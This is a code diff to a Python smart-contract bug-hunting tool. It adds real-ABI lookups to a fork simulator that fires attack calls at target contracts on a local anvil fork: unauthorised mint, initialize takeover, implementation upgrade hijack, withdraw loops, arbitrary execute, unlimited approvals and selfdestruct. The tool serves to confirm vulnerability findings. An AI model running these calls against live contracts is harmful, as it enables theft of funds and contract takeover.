@@ -2,6 +2,8 @@
 import subprocess
 from typing import Dict, List, Optional
 
+from defihunter.core import abi as abi_util
+
 def run(cmd: str, timeout: int = 60) -> str:
     result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
     return result.stdout.strip()
@@ -396,6 +398,67 @@ class ForkSimulator:
         # anvil dev account #2: always unlocked + funded on any anvil fork, and
         # from the protocol's perspective it is just an arbitrary EOA.
         self.attacker = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"
+        # real ABI for the target (when known) — see run(abi=...)
+        self._abi: List[Dict] = []
+        self._attack_candidates: List[tuple] = []
+
+    # Function names that carry each attack route. The ABI tells us the REAL
+    # signature with the REAL input types — no more selector guessing.
+    ATTACK_FN_NAMES = {
+        "mint": ["mint", "mintTo", "mintToken"],
+        "initialize": ["initialize", "init"],
+        "delegatecall": ["upgradeTo", "upgrade", "setImplementation",
+                         "setTarget", "changeImplementation",
+                         "updateImplementation", "setLogic"],
+        "reentrancy": ["withdraw", "withdrawTo", "claim", "redeem", "unstake",
+                       "harvest", "withdrawAll", "emergencyWithdraw"],
+        "arbitrarycall": ["execute", "call", "exec", "performAction",
+                          "governanceCall", "forward", "execute3"],
+        "approve": ["approve", "setApprovalForAll", "increaseAllowance"],
+        "selfdestruct": ["selfdestruct", "kill", "destroy", "die",
+                         "killMe", "close"],
+    }
+    MAX_UINT = ("11579208923731619542357098500868790785326998466564056403"
+                "9457584007913129639935")
+
+    def _abi_candidates(self, attack: str) -> List[tuple]:
+        """(signature, args) pairs for functions in the REAL ABI that map to
+        this attack route. Empty when the ABI is unknown or has no match —
+        callers fall back to the hardcoded guess battery."""
+        out = []
+        for fn in abi_util.functions(self._abi):
+            name = fn.get("name", "")
+            if name not in self.ATTACK_FN_NAMES.get(attack, ()):
+                continue
+            args = []
+            for inp in fn.get("inputs", []):
+                t = inp.get("type", "")
+                if t == "address":
+                    args.append(self.attacker)
+                elif t.startswith("uint"):
+                    if attack == "approve":
+                        args.append(self.MAX_UINT)
+                    elif attack == "reentrancy":
+                        args.append("1")  # 1 wei — avoids balance limits
+                    else:
+                        args.append("1000000")
+                elif t == "bool":
+                    args.append("true")
+                elif t == "bytes":
+                    args.append("0x" + "00" * 4)
+                elif t == "string":
+                    args.append("")
+                else:
+                    args.append("0")
+            out.append((abi_util.canonical(fn), args))
+        return out
+
+    def _merge_candidates(self, hardcoded: List[tuple]) -> List[tuple]:
+        """ABI-derived candidates first; hardcoded guesses only when the ABI
+        did not already give us that exact signature."""
+        abi_sigs = {sig for sig, _ in self._attack_candidates}
+        return (self._attack_candidates
+                + [c for c in hardcoded if c[0] not in abi_sigs])
 
     @staticmethod
     def _free_port() -> int:
@@ -509,7 +572,35 @@ class ForkSimulator:
         return {"ok": proc.returncode == 0, "stdout": proc.stdout.strip(),
                 "stderr": proc.stderr.strip()}
 
-    def run(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
+    def run(self, attack: str, target: str, source_finding: Optional[Dict] = None,
+            abi: Optional[List[Dict]] = None) -> Dict:
+        """Prove the finding on a real anvil fork, using the contract's REAL
+        ABI when provided (real signatures, real input types — no guessing).
+
+        Returns a result dict with a `verdict`:
+          CONFIRMED   — a state-changing tx from an arbitrary account mined
+                        (or an eth_call returned) and evidence shows effect
+          REFUTED     — the ABI says the function exists but every call
+                        reverted (or the target has no code) → NOT callable
+          UNVERIFIED  — could not prove either way (no ABI, no matching
+                        function, or the fork never came up)
+        """
+        self._abi = abi or []
+        self._attack_candidates = self._abi_candidates(attack)
+        res = self._run_impl(attack, target, source_finding)
+        if res.get("success"):
+            res["verdict"] = "CONFIRMED"
+        elif res.get("verdict"):  # already set inside (e.g. no code on fork)
+            pass
+        elif not self.available:
+            res["verdict"] = "UNVERIFIED"
+        elif self._attack_candidates:
+            res["verdict"] = "REFUTED"
+        else:
+            res["verdict"] = "UNVERIFIED"
+        return res
+
+    def _run_impl(self, attack: str, target: str, source_finding: Optional[Dict] = None) -> Dict:
         """Prove the finding on a real anvil fork.
 
         mint / initialize get the full state-changing proof: the attacker is
@@ -530,6 +621,7 @@ class ForkSimulator:
             # exist on this network (devnet-only deploy, placeholder, EOA).
             # Any tx/call would mine vacuously — NOT evidence of exploitability.
             return {"success": False, "attack": attack, "target": target,
+                    "verdict": "REFUTED",
                     "steps": [{"step": "code check",
                                "value": "no code at address on this fork"}],
                     "evidence": ("target has no bytecode on this fork "
@@ -540,28 +632,34 @@ class ForkSimulator:
             # state-diff: read attacker balance BEFORE the tx, then after
             br0 = self._call("balanceOf(address)", [self.attacker], extra_from=False)
             before = br0["stdout"] or "0"
-            r = self._send("mint(address,uint256)", [self.attacker, "1000000"])
-            if r["ok"]:
-                br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
-                bal = br["stdout"]
-                steps.append({"step": "mint(address,uint256) sent from arbitrary account",
-                              "value": "tx mined ✅"})
-                steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
-                              "value": f"{before} → {bal or 'read failed'}"})
-                return {"success": True, "attack": attack, "target": target,
-                        "profit": "Unlimited token supply minted for free",
-                        "steps": steps,
-                        "evidence": f"balanceOf(attacker) {before} → {bal or 'n/a'}",
-                        "source_finding": source_finding}
+            tried = []
+            for sel, args in self._merge_candidates(
+                    [("mint(address,uint256)", [self.attacker, "1000000"])]):
+                r = self._send(sel, args)
+                tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
+                if r["ok"]:
+                    br = self._call("balanceOf(address)", [self.attacker], extra_from=False)
+                    bal = br["stdout"]
+                    steps.append({"step": sel + " sent from arbitrary account",
+                                  "value": "tx mined ✅"})
+                    steps.append({"step": f"balanceOf({self.attacker[:10]}…) before → after",
+                                  "value": f"{before} → {bal or 'read failed'}"})
+                    return {"success": True, "attack": attack, "target": target,
+                            "profit": "Unlimited token supply minted for free",
+                            "steps": steps,
+                            "evidence": f"balanceOf(attacker) {before} → {bal or 'n/a'}",
+                            "source_finding": source_finding}
+            steps.append({"step": "mint selectors tried", "value": "; ".join(tried)})
             return {"success": False, "attack": attack, "target": target,
-                    "steps": steps, "evidence": r["stderr"][:200],
+                    "steps": steps, "evidence": r["stderr"][:200] if r else "no mint() found",
                     "source_finding": source_finding}
 
         if attack == "initialize":
             owner_before = self._read("owner()")
             tried = []
-            for sel, args in [("initialize(address)", [self.attacker]),
-                              ("initialize()", [])]:
+            for sel, args in self._merge_candidates(
+                    [("initialize(address)", [self.attacker]),
+                     ("initialize()", [])]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -590,9 +688,10 @@ class ForkSimulator:
             # implementation and invalidate every subsequent check.
             dummy = "0x2222222222222222222222222222222222222222"
             tried = []
-            for sel, args in [("upgradeTo(address)", [dummy]),
-                              ("setImplementation(address)", [dummy]),
-                              ("setTarget(address)", [dummy])]:
+            for sel, args in self._merge_candidates(
+                    [("upgradeTo(address)", [dummy]),
+                     ("setImplementation(address)", [dummy]),
+                     ("setTarget(address)", [dummy])]):
                 r = self._call(sel, args)
                 tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -613,14 +712,15 @@ class ForkSimulator:
             # (The DAO 2016 pattern): ETH leaves the contract before state
             # settles, so a callback can re-enter and double-withdraw.
             tried = []
-            for sel, args in [("withdraw(uint256)", ["1000"]),
-                              ("withdraw()", []),
-                              ("claim()", []),
-                              ("redeem()", []),
-                              ("unstake()", []),
-                              ("harvest()", []),
-                              ("withdrawAll()", []),
-                              ("emergencyWithdraw()", [])]:
+            for sel, args in self._merge_candidates(
+                    [("withdraw(uint256)", ["1000"]),
+                     ("withdraw()", []),
+                     ("claim()", []),
+                     ("redeem()", []),
+                     ("unstake()", []),
+                     ("harvest()", []),
+                     ("withdrawAll()", []),
+                     ("emergencyWithdraw()", [])]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -645,12 +745,13 @@ class ForkSimulator:
             # attacker calldata would clobber fork state for later checks.
             payload = "0x" + "00" * 4  # benign no-op calldata for the callee
             tried = []
-            for sel, args in [("execute(address,bytes)", [self.attacker, payload]),
-                              ("call(address,bytes)", [self.attacker, payload]),
-                              ("exec(address,bytes)", [self.attacker, payload]),
-                              ("performAction(address,bytes)", [self.attacker, payload]),
-                              ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
-                              ("governanceCall(address,bytes)", [self.attacker, payload])]:
+            for sel, args in self._merge_candidates(
+                    [("execute(address,bytes)", [self.attacker, payload]),
+                     ("call(address,bytes)", [self.attacker, payload]),
+                     ("exec(address,bytes)", [self.attacker, payload]),
+                     ("performAction(address,bytes)", [self.attacker, payload]),
+                     ("execute(address,uint256,bytes)", [self.attacker, "0", payload]),
+                     ("governanceCall(address,bytes)", [self.attacker, payload])]):
                 r = self._call(sel, args)
                 tried.append(f"{sel}: {'returned' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -674,8 +775,9 @@ class ForkSimulator:
             # entire balance in one tx.
             max_allow = "115792089237316195423570985008687907853269984665640564039457584007913129639935"
             tried = []
-            for sel, args in [("approve(address,uint256)", [self.attacker, max_allow]),
-                              ("setApprovalForAll(address,bool)", [self.attacker, "true"])]:
+            for sel, args in self._merge_candidates(
+                    [("approve(address,uint256)", [self.attacker, max_allow]),
+                     ("setApprovalForAll(address,bool)", [self.attacker, "true"])]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
@@ -699,13 +801,14 @@ class ForkSimulator:
         if attack == "selfdestruct":
             before = self._balance(self._target)
             tried = []
-            for sel, args in [("selfdestruct()", []),
-                              ("kill()", []),
-                              ("destroy()", []),
-                              ("die()", []),
-                              ("kill(address)", [self.attacker]),
-                              ("destroy(address)", [self.attacker]),
-                              ("selfdestruct(address)", [self.attacker])]:
+            for sel, args in self._merge_candidates(
+                    [("selfdestruct()", []),
+                     ("kill()", []),
+                     ("destroy()", []),
+                     ("die()", []),
+                     ("kill(address)", [self.attacker]),
+                     ("destroy(address)", [self.attacker]),
+                     ("selfdestruct(address)", [self.attacker])]):
                 r = self._send(sel, args)
                 tried.append(f"{sel}: {'mined' if r['ok'] else 'reverted'}")
                 if r["ok"]:
